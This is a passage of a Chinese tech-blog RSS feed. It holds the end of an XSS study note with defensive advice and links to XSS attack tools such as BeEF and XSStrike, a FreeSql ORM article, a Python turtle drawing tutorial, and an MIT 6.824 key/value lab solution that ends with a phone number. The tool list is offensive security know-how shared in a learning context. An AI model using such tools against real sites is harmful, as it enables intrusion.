&lt;h3 id=&quot;输出&quot;&gt;输出&lt;/h3&gt;
&lt;p&gt;       减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。&lt;/p&gt;
&lt;h3 id=&quot;其他&quot;&gt;其他&lt;/h3&gt;
&lt;p&gt;       设置HttpOnly，开启WAF。&lt;/p&gt;

&lt;p&gt;       感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注&lt;a href=&quot;http://www.cnblogs.com/yunen/p/www.0x002.com&quot;&gt;我的博客&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;br/&gt;书籍：&lt;br/&gt;《Web前端黑客技术揭秘》&lt;br/&gt;《XSS跨站脚本攻击剖析与防御》&lt;br/&gt;《白帽子讲Web安全》&lt;br/&gt;《黑客攻防技术宝典Web实战篇》第二版&lt;br/&gt;文章：&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2936&quot;&gt;XSS小结&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://github.com/dwqs/blog/issues/68&quot;&gt;浅说 XSS 和 CSRF&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://blog.csdn.net/h_mxc/article/details/50542038&quot;&gt;Session攻击手段(会话劫持/固定)及其安全防御措施&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md 2017灰袍技能精华&lt;br/&gt;https://github.com/rajeshmajumdar/BruteXSS BruteXSS&lt;br/&gt;https://github.com/beefproject/beef Beef神器&lt;br/&gt;https://github.com/1N3/XSSTracer 用于检查跨站点跟踪的小型python脚本&lt;br/&gt;https://github.com/0x584A/fuzzXssPHP 一个非常简单的反射XSS扫描仪支持GET/POST&lt;br/&gt;https://github.com/chuhades/xss_scan 反射xss扫描器&lt;br/&gt;https://github.com/BlackHole1/autoFindXssAndCsrf 浏览器的插件，它自动检查页面是否具有xss和漏洞&lt;br/&gt;https://github.com/shogunlab/shuriken xss命令行工具用于测试web应用程序中xss负载列表&lt;br/&gt;https://github.com/UltimateHackers/XSStrike 用于XSS、WAF检测和旁路的模糊和蛮力参数&lt;br/&gt;https://github.com/stamparm/DSXS 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 14:05:00 +0000</pubDate>
<dc:creator>Yunen的博客</dc:creator>
<og:description>简单概述 &amp; 160; &amp; 160; &amp; 160; &amp; 160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yunen/p/10581320.html</dc:identifier>
</item>
<item>
<title>跟踪测试 DbContext ，向＂不是真正的 ORM＂ 说拜拜 - nicye</title>
<link>http://www.cnblogs.com/kellynic/p/10580936.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kellynic/p/10580936.html</guid>
<description>&lt;p&gt;FreeSql 发展到现在，已经有两种稳定的开发模式，以下先简单带过一下。后面才是本文的主题。&lt;/p&gt;
&lt;h2 id=&quot;方法一基于-helper-的方式祼用&quot;&gt;方法一：基于 helper 的方式，祼用；&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;dotnet add package FreeSql&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;提供 CodeFirst、DbFirst、丰富的表达式树、读写分离、AOP等功能支持；&lt;/p&gt;
&lt;h2 id=&quot;方法二基于-repository-unitofwok-的方式&quot;&gt;方法二：基于 Repository + UnitOfWok 的方式；&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;dotnet add package FreeSql.Repository&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是一个扩展包，提供标准的 IRepository 接口定义与默认实现，以及 UnitOfWork 工作单元的支持，更可怕的是集成了局部/全局过滤器，实现租户、软删除等功能不在话下。&lt;/p&gt;
&lt;p&gt;不相信吗？请看以下代码：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public IServiceProvider ConfigureServices(IServiceCollection services) {
    services.AddSingleton&amp;lt;IFreeSql&amp;gt;(fsql);
    services.AddMvc();

    var builder = new ContainerBuilder();

    builder.RegisterFreeRepository(filter =&amp;gt; filter
        .Apply&amp;lt;ISoftDelete&amp;gt;(&quot;SoftDelete&quot;, a =&amp;gt; a.IsDeleted == false)
        .Apply&amp;lt;ITenant&amp;gt;(&quot;Tenant&quot;, a =&amp;gt; a.TenantId == 1)
    );

    builder.Populate(services);
    var container = builder.Build();
    return new AutofacServiceProvider(container);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;比 abpvnext 还要方便，因为 abp 的相关实体需要实现接口 ISoftDelete、ITenant；&lt;/p&gt;
&lt;p&gt;我们没有这个限制，只要过滤器的表达式解析成功，就算可用；&lt;/p&gt;
&lt;p&gt;使用在任何实体上的时候，只要 [实体].IsDeleted == false 能解析能过，就算可用；&lt;/p&gt;

&lt;p&gt;这个项目仍然是一个扩展包，提类似 EFCore 那样的开发习惯。目前定义的规则如下：&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;文字规则略显复杂，后边有代码演示，以及图文介绍在 sqlite 和 sqlserver 下的测试过程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;dbcontext&quot;&gt;DbContext&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;提供 SaveChanges 方法；&lt;/li&gt;
&lt;li&gt;执行队列；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;dbset&quot;&gt;DbSet&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;提供 Add、AddRange、Remove、RemoveRange、Update、UpdateRange 方法；&lt;/li&gt;
&lt;li&gt;以及 Select 属性（连去原有的 FreeSql 查询对象）；&lt;/li&gt;
&lt;li&gt;私有对象 states，存储实体的副本哈希集合，key=实体的主键值，value=实体；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;addaddrangeentitys&quot;&gt;Add/AddRange(entitys)&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，是否存在于 states 中，存在时报错；&lt;/li&gt;
&lt;li&gt;验证 entitys 主键中存在自增：
&lt;ul&gt;&lt;li&gt;若有，则立即开启 DbContext 事务，按数据库种类执行相应的方法，最终将返回的自增值，赋给entitys的属性；&lt;/li&gt;
&lt;li&gt;若无，并且 entitys 无主键值，则报错；&lt;/li&gt;
&lt;li&gt;否则，进入【打包执行队列】；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;完成时更新 states；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;removeremoverangeentitys&quot;&gt;Remove/RemoveRange(entitys)&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，若无则报错；&lt;/li&gt;
&lt;li&gt;验证 states 中是否存在，若无则提醒应该先查询，再删除；&lt;/li&gt;
&lt;li&gt;删除 states 对应的实体；&lt;/li&gt;
&lt;li&gt;清除 entitys 内的自增属性值、Guid 类型的值，那这个 entitys 将变为可 Add 状态；&lt;/li&gt;
&lt;li&gt;进入【打包执行队列】；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;updateupdaterangeentitys&quot;&gt;Update/UpdateRange(entitys)&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，若无则报错；&lt;/li&gt;
&lt;li&gt;验证 states 中是否存在，若无则提醒应该先查询，再删除；&lt;/li&gt;
&lt;li&gt;进入【打包执行队列】；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;select&quot;&gt;Select&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;立即执行队列中的命令（打包方式），以免脏读到未提交的数据；&lt;/li&gt;
&lt;li&gt;查询完成时，更新 states 的值；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;更新数据规则&quot;&gt;更新数据规则&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;对比 states 中存在的历史快照值，返回即将修改的 fields；&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;using FreeSql;

public class SongContext : DbContext {

    public DbSet&amp;lt;Song&amp;gt; Songs { get; set; }
    public DbSet&amp;lt;Tag&amp;gt; Tags { get; set; }

    protected override void OnConfiguring(DbContextOptionsBuilder builder) {
        builder.UseFreeSql(这里是IFreeeSql对象);
    }
}

public class Song {
    [Column(IsIdentity = true)]
    public int Id { get; set; }
    public DateTime? Create_time { get; set; }
    public bool? Is_deleted { get; set; }
    public string Title { get; set; }
    public string Url { get; set; }
}
public class Tag {
    [Column(IsIdentity = true)]
    public int Id { get; set; }
    public string Name { get; set; }
}

using (var ctx = new SongContext()) {

    ctx.Songs.Select.Where(a =&amp;gt; a.Id &amp;gt; 10).ToList();
    //查询结果，存入 states

    var song = new Song { };
    //可插入的 song

    ctx.Songs.Add(song);
    id = song.Id;
    //因有自增类型，立即开启事务执行SQL，返回自增值

    var adds = Enumerable.Range(0, 100)
        .Select(a =&amp;gt; new Song { Create_time = DateTime.Now, Is_deleted = false, Title = &quot;xxxx&quot; + a, Url = &quot;url222&quot; })
        .ToList();
    //创建一堆无主键值的数据

    ctx.Songs.AddRange(adds);
    //立即执行，将自增值赋给 adds 所有元素，因为有自增类型，如果其他类型，指定传入主键值，不会立即执行

    for (var a = 0; a &amp;lt; adds.Count; a++)
        adds[a].Title = &quot;dkdkdkdk&quot; + a;

    ctx.Songs.UpdateRange(adds);
    //批量修改，进入队列

    ctx.Songs.RemoveRange(adds.Skip(10).Take(20).ToList());
    //批量删除，进入队列，完成时 10-20 元素的主键值会被清除

    //ctx.Songs.Update(adds.First());

    adds.Last().Url = &quot;skldfjlksdjglkjjcccc&quot;;
    ctx.Songs.Update(adds.Last());
    //单条修改 urls 的值，进入队列

    //throw new Exception(&quot;回滚&quot;);

    //ctx.Songs.Select.First();
    //这里做一个查询，会立即打包【执行队列】，避免没有提交的数据，影响查询结果

    ctx.SaveChanges();
    //打包【执行队列】，提交事务
}&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202503725-1998910232.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202625566-1608088349.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202901970-1702592454.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;打个岔：为什么一条条的执行？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;有自增属性需要获取值；&lt;/li&gt;
&lt;li&gt;sqlite 没有批量插入获取多个自增的办法，或者您有招来支一支(万分感谢)；&lt;/li&gt;
&lt;li&gt;后面采用 sqlserver 测试，就不是这个境况了，insert into values(),(),()，然后利用 output 特性返回所有值；
&lt;ul&gt;&lt;li&gt;比较蛋疼的是，这个特性不是所有数据库都有&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322203314837-1972352220.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322203514389-958794814.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看见，最终 SaveChanges 时将不会产生影响的命令，一起打包执行，即采用优化合并的方式进行执行。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;ctx.Songs.Update(adds[0]);
ctx.Songs.Update(adds[1]);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这两个更新操作，会合成一条 SQL 命令执行。&lt;/p&gt;

&lt;p&gt;其实大致与 sqlite 下相同，唯一的区别在于 AddRange 的处理方式，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322204114268-1554751503.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当插入单条时，采用了第一行代码的 SQL 命令；&lt;/p&gt;
&lt;p&gt;当批量插入时，采用了后面看上去复杂的 SQL 命令；&lt;/p&gt;
&lt;p&gt;所有传入的实体属性值在执行完成后，都会更新；&lt;/p&gt;
&lt;h2 id=&quot;特别说明&quot;&gt;特别说明&lt;/h2&gt;
&lt;p&gt;FreeSql.DbContext 目前仍处于研究开发阶段，不适合商用；&lt;/p&gt;

&lt;p&gt;为什么写这篇文章，时常看见有人说某某 orm 不是真正的 orm，没有 OO 思想。&lt;/p&gt;
&lt;p&gt;希望 FreeSql.DbContext 随着时间的积累，稳定性和成熟度有所提升，不久成为一个真正的 ORM。&lt;/p&gt;
&lt;p&gt;有人会担心，我们第三方做的不靠谱，没有 EFCore 稳定的说话，这个是当然。&lt;/p&gt;
&lt;p&gt;但是我们也有自己的特点，不是吗？我们可以做到多种数据库使用习惯的一致性，这点 EFCore 目前是没有办法解决的难题。&lt;/p&gt;
&lt;p&gt;从细节出发，我们的口号是：做 .NETCore 最方便的 ORM！&lt;/p&gt;
&lt;p&gt;github: &lt;a href=&quot;https://github.com/2881099/FreeSql&quot; class=&quot;uri&quot;&gt;https://github.com/2881099/FreeSql&lt;/a&gt; 377星&lt;/p&gt;
&lt;p&gt;还请献上宝贵的一星，谢谢观看！！&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 13:02:00 +0000</pubDate>
<dc:creator>nicye</dc:creator>
<og:description>FreeSql 发展到现在，已经有两种稳定的开发模式，以下先简单带过一下。后面才是本文的主题。 方法一：基于 helper 的方式，祼用； dotnet add package FreeSql 提供</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kellynic/p/10580936.html</dc:identifier>
</item>
<item>
<title>Python入门必学，用Python练习画个美队盾牌 - 上海小胖</title>
<link>http://www.cnblogs.com/moonhmily/p/10580824.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/moonhmily/p/10580824.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190322202431995.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTIzNjU4Mjg=,size_16,color_FFFFFF,t_70&quot; alt=&quot;美队盾牌&quot;/&gt;&lt;/p&gt;

&lt;p&gt;Python版本：3.6.6&lt;/p&gt;
&lt;p&gt;操作系统：Mac OS Mojave 10.14.2&lt;/p&gt;

&lt;p&gt;最近我媳妇每天晚上吃饭时候也拿手机看，上厕所也在看。&lt;/p&gt;
&lt;p&gt;看着看着还会笑？WTF？你在干嘛呢？&lt;/p&gt;
&lt;p&gt;没错，她在看美队……&lt;/p&gt;
&lt;p&gt;这男人比我帅？……&lt;/p&gt;
&lt;p&gt;比我有钱？……&lt;/p&gt;
&lt;p&gt;还是比我有腔调？……&lt;/p&gt;
&lt;p&gt;答案很明显，我相信你们的眼睛都是雪亮的。&lt;/p&gt;
&lt;p&gt;那问题来了，作为一个男人，怎么能忍？虽然是个明星，虽然是假的，虽然已经挽回不了败局了……那我就送个美队的盾牌给你吧……&lt;/p&gt;
&lt;p&gt;这篇文章不是Turtle的入门篇，所以关于基本的画笔使用小胖不在这篇里赘述了。有兴趣的可以留言，我会根据你们的反馈来写一篇或者一个系列。&lt;/p&gt;

&lt;p&gt;先来看一个效果图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190322200514458.gif&quot; alt=&quot;美队盾牌&quot;/&gt;&lt;/p&gt;
&lt;p&gt;用过Turtle的都知道，画笔是需要抬手和落笔的。这一点一定要理解，因为计算机是很死板的，你的每一个动作都必须告诉他，包括GC。&lt;/p&gt;
&lt;p&gt;所以你的画笔一旦落下，经过的每一处都会留下字迹。如果希望隔开一段距离就需要经过「抬笔」-&amp;gt;「移动画笔」-&amp;gt;「落笔」。&lt;/p&gt;
&lt;p&gt;所以我们先把这个动作封装成一个函数：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def setpen(x, y):
    # 抬笔
    t.penup()
    # 移动画笔到(x, y)
    t.goto(x, y)
    # 落笔
    t.pendown()
    t.setheading(0)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来就来画盾牌。盾牌的话，注意观察美队盾牌，颜色是「红」-&amp;gt;「白」-&amp;gt;「红」-&amp;gt;「蓝」。&lt;/p&gt;
&lt;p&gt;这里有一个技巧，就是后面填充的圆圈背景色是可以覆盖之前画的圆圈的背景色。&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def circle(x, y, r, color):
    # 为了保证画出的圆够圆，所以我们把圆的边设置的多一些
    n = 36
    angle = 360 / n
    pi = 3.1415926
    # 周长
    c = 2 * pi * r
    # 每条边的长度
    l = c / n
    # 起始位置
    start_x = x - l / 2
    start_y = y + r
    # 移动画笔
    setpen(start_x, start_y)
    # 选择画笔颜色
    t.pencolor(color)
    # 选择背景色
    t.fillcolor(color)
    # 填充
    t.begin_fill()
    for i in range(n):
        t.forward(l)
        t.right(angle)
    t.end_fill()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来就是画里面那个白色的五角星了，这里就不注释了，因为和画圈的过程差不多。&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def five_star(l):
    setpen(0, 0)
    t.setheading(162)
    t.forward(150)
    t.setheading(0)
    t.fillcolor('WhiteSmoke')
    t.begin_fill()
    t.hideturtle()
    t.penup()
    for i in range(5):
        t.forward(l)
        t.right(144)
    t.end_fill()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;主函数：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def sheild():
    circle(0, 0, 300, 'red')
    circle(0, 0, 250, 'white')
    circle(0, 0, 200, 'red')
    circle(0, 0, 150, 'blue')
    five_star(284)

if __name__ == '__main__':
    sheild()
    # 结束乌龟图
    turtle.done()&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;这是一篇用Python画画的文章，更多有趣、好玩的Python应用、实战尽在知识星球「人人都是Pythonista」。&lt;/p&gt;
&lt;p&gt;关注公众号「&lt;strong&gt;Python专栏&lt;/strong&gt;」，回复：&lt;strong&gt;美队盾牌&lt;/strong&gt;，获取全套代码！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/649191/201902/649191-20190228222044609-1976101388.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Python专栏二维码&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 12:35:00 +0000</pubDate>
<dc:creator>上海小胖</dc:creator>
<og:description>这是一篇用Python画画的文章，更多有趣、好玩的Python应用、实战尽在知识星球「人人都是Pythonista」。 关注公众号「**Python专栏**」，回复：**美队盾牌**，获取全套代</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/moonhmily/p/10580824.html</dc:identifier>
</item>
<item>
<title>MIT-6.824 Lab 3: Fault-tolerant Key/Value Service - gatsby123</title>
<link>http://www.cnblogs.com/gatsby123/p/10580757.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/gatsby123/p/10580757.html</guid>
<description>&lt;p&gt;lab2中实现了raft协议，本lab将在raft之上实现一个可容错的k/v存储服务，第一部分是实现一个不带日志压缩的版本，第二部分是实现日志压缩。时间原因我只完成了第一部分。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.824/lab3-KVServer/kvserver.png&quot; alt=&quot;kvserver&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上图，lab2实现了raft协议，本lab将实现kvserver。每个raft都关联一个kvserver，Clerks发送Put(), Append(), Get() RPC给leader服务器中的kvserver，kvserver收到请求后将操作打包成Log Entry提交给raft，然后阻塞等待raft将这个Entry拷贝到其它server，当Log Entry被拷贝到大部分的server后，leader 的raft会通知kvserver（raft往管道中塞comitted Entry，kvserver通过读这个管道获取通知），kvserver执行命令，然后响应Clerk。&lt;/p&gt;
&lt;h2 id=&quot;clerk&quot;&gt;Clerk&lt;/h2&gt;
&lt;p&gt;客户端通过Clerk发送请求，来看下Clerk代码：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;type Clerk struct {
    servers []*labrpc.ClientEnd
    // You will have to modify this struct.

    lastLeader  int
    cid         int64
    seq         int
}

func (ck *Clerk) Get(key string) string {

    // You will have to modify this function.
    // 参数: 要读的key, 当前clerk的id，  请求序列号
    getArgs := GetArgs{Key: key, Cid:ck.cid, Seq:ck.seq}
    reply := GetReply{}

    for {
        doneCh := make(chan bool, 1)
        go func() {
           //发送Get() RPC
            ok := ck.servers[ck.lastLeader].Call(&quot;KVServer.Get&quot;, &amp;amp;getArgs, &amp;amp;reply)
            doneCh &amp;lt;- ok
        }()

        select {
        case &amp;lt;-time.After(600 * time.Millisecond):
            DPrintf(&quot;clerk(%d) retry PutAppend after timeout\n&quot;, ck.cid)
            continue
        case ok := &amp;lt;- doneCh:
           //收到响应后，并且是leader返回的，那么说明这个命令已经执行了
            if ok &amp;amp;&amp;amp; reply.WrongLeader != WrongLeader {
                //请求序列号加1
              ck.seq++
                return reply.Value
            }
        }

       //换一个server重试
        ck.lastLeader++
        ck.lastLeader %= len(ck.servers)
    }

    return &quot;&quot;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里只给出了Get()的代码，Put()和Append()类似，发送KVServer.Get给一个server，如果这个server不是leader，换一个server重试。直到发给真正的leader，并且leader将这个命令拷贝到大部分其它server后，然后成功执行该命令，Clerk.Get()才会返回。&lt;/p&gt;
&lt;h2 id=&quot;kvserver&quot;&gt;KVServer&lt;/h2&gt;
&lt;p&gt;再来看下服务端的代码，KVServer处理Clerk的RPC请求：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;type KVServer struct {
    mu      sync.Mutex
    me      int
    rf      *raft.Raft
    applyCh chan raft.ApplyMsg

    maxraftstate int // snapshot if log grows this big

    // Your definitions here.
   // 保存键值对
    db      map[string]string
    latestReplies map[int64]*LatestReply
    notify map[int]chan struct{}
}

func (kv *KVServer) Get(args *GetArgs, reply *GetReply) {
    // Your code here.
    if _, isLeader := kv.rf.GetState(); !isLeader {
        reply.WrongLeader = WrongLeader
        reply.Err = &quot;&quot;
        return
    }

    // 防止重复请求
    kv.mu.Lock()
    if latestReply, ok := kv.latestReplies[args.Cid]; ok &amp;amp;&amp;amp; args.Seq &amp;lt;= latestReply.Seq {
        reply.WrongLeader = IsLeader
        reply.Value = latestReply.Reply.Value
        reply.Err = latestReply.Reply.Err
        kv.mu.Unlock()
        return
    }
    kv.mu.Unlock()

    command := Op{Operation:&quot;Get&quot;, Key:args.Key, Cid:args.Cid, Seq:args.Seq}
    index, term, _ := kv.rf.Start(command)

    // 阻塞等待结果
    kv.mu.Lock()
    ch := make(chan struct{})
    kv.notify[index] = ch
    kv.mu.Unlock()

    select {
    case &amp;lt;-ch:
        curTerm, isLeader := kv.rf.GetState()
        DPrintf(&quot;%v got notify at index %v, isLeader = %v\n&quot;, kv.me, index, isLeader)
        if !isLeader || curTerm != term {
            reply.WrongLeader = WrongLeader
            reply.Err = &quot;&quot;
        } else {
            reply.WrongLeader = IsLeader
            kv.mu.Lock()
            if value, ok := kv.db[args.Key]; ok {
                reply.Value = value
                reply.Err = OK
            } else {
                reply.Err = ErrNoKey
            }
            kv.mu.Unlock()
        }

    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;KVServer.db用于保存键值对。&lt;br/&gt;KVServer.Get()首先判断自己是不是leader，如果不是leader，直接返回，这样Clerk好重试其它server。如果是leader，先在缓存中找，看这个请求是否已经执行过了。&lt;br/&gt;因为可能出现这么一种情况：如果leader commit一个Entry后立即奔溃了，那么Clerk就收不到响应，那么Clerk会将这个请求发给新的leader，新的leader收到请求后如果不做任何措施，将会二次commit该Log Entry，对于Put()和Append()请求执行两次是不正确的，所以需要一个办法防止一个请求执行两次。&lt;br/&gt;可以这么做：每个Clerk都分配一个唯一的cid，每个请求分配一个唯一的序列号seq，每成功一个请求，该序列号加一。服务端记录每个客户端cid最近一次apply的请求的序列号seq和对应的响应结果，根据这个信息可知，当再次收到这个客户端的序列号小于seq的请求时，说明已经执行过了，直接返回结果。&lt;/p&gt;
&lt;p&gt;如果之前没有执行过，那么调用&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;kv.rf.Start(command)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将Log Entry提交给raft，并且阻塞等待raft将这个Entry拷贝到其它大部分server，从阻塞返回后，说明这个Entry已经被拷贝到大部分server了，并且已经执行了命令，这时可以将结果返回给Clerk了。&lt;/p&gt;
&lt;p&gt;那么在哪里接收raft的消息呢？KVServer在创建的时候会在一个线程中执行如下函数：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func (kv *KVServer) applyDaemon()  {
    for appliedEntry := range kv.applyCh {
        command := appliedEntry.Command.(Op)

        // 执行命令, 过滤已经执行过得命令
        kv.mu.Lock()
        if latestReply, ok := kv.latestReplies[command.Cid]; !ok || command.Seq &amp;gt; latestReply.Seq {
            switch command.Operation {
            case &quot;Get&quot;:
                latestReply := LatestReply{Seq:command.Seq,}
                reply := GetReply{}
                if value, ok := kv.db[command.Key]; ok {
                    reply.Value = value
                } else {
                    reply.Err = ErrNoKey
                }
                latestReply.Reply = reply
                kv.latestReplies[command.Cid] = &amp;amp;latestReply
            case &quot;Put&quot;:
                kv.db[command.Key] = command.Value
                latestReply := LatestReply{Seq:command.Seq}
                kv.latestReplies[command.Cid] = &amp;amp;latestReply
            case &quot;Append&quot;:
                kv.db[command.Key] += command.Value
                latestReply := LatestReply{Seq:command.Seq}
                kv.latestReplies[command.Cid] = &amp;amp;latestReply
            default:
                panic(&quot;invalid command operation&quot;)
            }
        }

        DPrintf(&quot;%d applied index:%d, cmd:%v\n&quot;, kv.me, appliedEntry.CommandIndex, command)

        // 通知
        if ch, ok := kv.notify[appliedEntry.CommandIndex]; ok &amp;amp;&amp;amp; ch != nil {
            DPrintf(&quot;%d notify index %d\n&quot;,kv.me, appliedEntry.CommandIndex)
            close(ch)
            delete(kv.notify, appliedEntry.CommandIndex)
        }
        kv.mu.Unlock()
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;kv.applyCh这个chanel会在创建raft的时候传给raft，当某个Log Entry可以被commit的时候，raft会往这个chanel中塞，只要for循环这个kv.applyCh，就能知道已经被commit的Entry，拿到Entry后，根据其中的命令执行相应的操作，然后通知KVServer.Get()继续执行。&lt;/p&gt;
&lt;p&gt;具体代码在：&lt;a href=&quot;https://github.com/gatsbyd/mit_6.824_2018&quot; class=&quot;uri&quot;&gt;https://github.com/gatsbyd/mit_6.824_2018&lt;/a&gt;&lt;br/&gt;如有错误，欢迎指正：&lt;br/&gt;15313676365&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 12:22:00 +0000</pubDate>
<dc:creator>gatsby123</dc:creator>
<og:description>概述 lab2中实现了raft协议，本lab将在raft之上实现一个可容错的k/v存储服务，第一部分是实现一个不带日志压缩的版本，第二部分是实现日志压缩。时间原因我只完成了第一部分。 设计思路 ![k</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/gatsby123/p/10580757.html</dc:identifier>
</item>
</channel>
</rss>